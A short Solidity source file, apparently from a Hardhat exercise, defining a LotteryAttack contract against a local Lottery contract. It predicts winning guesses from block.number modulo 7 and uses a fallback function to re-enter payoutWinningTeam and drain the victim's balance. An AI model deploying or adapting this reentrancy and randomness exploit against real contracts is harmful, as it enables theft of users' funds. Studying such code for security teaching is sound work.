pragma solidity 0.6.0;
import "./Lottery.sol";
import "hardhat/console.sol";

contract LotteryAttack {
    Lottery public lotteryContract;

    event LogFallbackHit(uint256 balance);

    constructor(address payable _reentrancyContractAddress) public {
        lotteryContract = Lottery(_reentrancyContractAddress);
    }

    function guess(address addr) public {
        console.logString("guess hit");
        uint num = block.number;

        lotteryContract.makeAGuess(addr, num % 7);
    }

    function attack() external {
        console.logString("attack hit");
        lotteryContract.payoutWinningTeam();
    }

    fallback() external payable {
        console.logString("fallback hit");
        uint bal = address(lotteryContract).balance;
        emit LogFallbackHit(bal);
        
        if (bal > 0.1 ether) {
            console.logString("fallback 2 hit");
            lotteryContract.payoutWinningTeam();
        }
    }

}